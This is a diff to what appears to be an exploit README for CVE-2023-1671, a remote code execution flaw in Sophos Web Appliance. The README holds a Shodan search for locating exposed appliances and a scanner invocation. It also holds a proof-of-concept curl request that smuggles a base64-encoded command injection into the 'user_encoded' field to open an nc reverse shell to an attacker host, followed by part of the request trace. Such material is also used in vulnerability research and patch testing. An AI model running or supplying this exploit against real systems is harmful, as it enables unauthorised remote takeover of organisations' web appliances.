@@ -1,4 +1,5 @@
 ## CVE-2023-1671
+Sophos Web Appliance RCE
 - Shodan dork: <br/>
 ```
 title:"Sophos Web Appliance" <br/>
@@ -11,8 +12,7 @@ bash scanner.sh target.txt
 ### POC
 ```
 curl -k --trace-ascii % "https://victim_ip_addr/index.php?c=blocked&action=continue" -d "args_reason=filetypewarn&url=$RANDOM&filetype=$RANDOM&user=$RANDOM&user_encoded=$(echo -n "';nc -e /bin/sh attacker_ip_addr 4444 #" | base64)"
-```
-```
+
 => Send header, 184 bytes (0xb8)
 0000: POST /index.php?c=blocked&action=continue HTTP/1.1
 0034: Host: XX.XX.XX.XX
